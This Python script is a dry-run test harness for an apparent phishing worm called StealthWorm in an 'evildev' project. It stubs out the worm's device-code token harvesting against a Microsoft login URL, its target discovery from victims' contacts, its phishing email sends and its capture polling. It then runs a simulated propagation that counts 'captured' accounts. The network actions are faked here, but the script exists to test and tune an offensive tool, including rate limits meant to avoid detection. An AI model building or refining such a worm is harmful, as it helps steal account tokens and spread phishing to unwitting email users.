import os
import time
import random
import uuid
import importlib
import sys
from pathlib import Path

# Ensure project root is on sys.path so `evildev` package imports work
proj_root = str(Path(__file__).resolve().parents[1])
if proj_root not in sys.path:
    sys.path.insert(0, proj_root)

# Also add the evildev package folder so imports like `from db import ...` succeed
evildev_dir = str(Path(__file__).resolve().parents[1] / 'evildev')
if evildev_dir not in sys.path:
    sys.path.insert(0, evildev_dir)

# Configure short rate limits for the dry-run
os.environ['WORM_ENABLED'] = 'true'
os.environ['WORM_DEVICE_CODE_LIMIT'] = '2'
os.environ['WORM_DEVICE_CODE_WINDOW'] = '3'
os.environ['WORM_DEVICE_CODE_LIMIT_PER_DAY'] = '1000'
os.environ['WORM_MIN_EMAIL_DELAY'] = '0'
os.environ['CLIENT_ID'] = 'dry-run-client'

# Import worm module after env vars are set
worm_mod = importlib.import_module('worm')
importlib.reload(worm_mod)
harvester = importlib.import_module('harvester')

# Monkeypatch TokenHarvester.get_device_code to avoid network calls
def fake_get_device_code(self):
    code = uuid.uuid4().hex[:8].upper()
    return {
        'user_code': code,
        'device_code': 'dev-' + code,
        'verification_uri': 'https://login.microsoft.com/device'
    }

harvester.TokenHarvester.get_device_code = fake_get_device_code

# Monkeypatch StealthWorm discovery to return 6 targets
def fake_discover(self, token, max_targets):
    targets = []
    for i in range(6):
        targets.append((f'target{i+1}@example.com', 'contact', 10, 'simulated'))
    return targets

worm_mod.StealthWorm._discover_targets = fake_discover

# Monkeypatch _send_phish to just log and succeed
def fake_send(self, token, email, user_code, verification_uri):
    print(f"Simulated send to {email} with code {user_code} @ {verification_uri}")
    return True

worm_mod.StealthWorm._send_phish = fake_send

# Monkeypatch _poll_target to simulate capture quickly
def fake_poll(self, device_info, email, token, depth, score, relationship):
    print(f"Simulated polling for {email} (device_code={device_info.get('device_code')})")
    time.sleep(random.uniform(0.1, 0.3))
    self.captured.add(email)
    self._stats['total_captured'] += 1
    print(f"{email} captured (simulated)")

worm_mod.StealthWorm._poll_target = fake_poll

# Run dry-run
import sqlite3

# Provide a simple in-memory DB `conn` expected by worm.py
conn = sqlite3.connect(':memory:')
cur = conn.cursor()
# Create minimal `targets` and `worm_stats` tables used by the worm
cur.execute('''CREATE TABLE IF NOT EXISTS targets (
    email TEXT, source_email TEXT, depth INTEGER, user_code TEXT, device_code TEXT,
    status TEXT, col7 TEXT, score INTEGER, col9 TEXT, relationship TEXT, created_at TEXT
)''')
cur.execute('''CREATE TABLE IF NOT EXISTS worm_stats (
    key TEXT, value TEXT, ts TEXT
)''')
conn.commit()

worm_mod.conn = conn

w = worm_mod.StealthWorm()
print("Starting dry-run propagation (6 targets) with tight device-code limits")
start = time.time()
w.propagate('fake-token', 'operator@example.com', depth=0)
end = time.time()

print('\nDry-run complete')
print('Duration: %.2fs' % (end - start))
print('Stats:', w._stats)
print('Device code timestamps recorded:', len(w._device_code_timestamps))
print('Captured:', len(w.captured), list(w.captured))
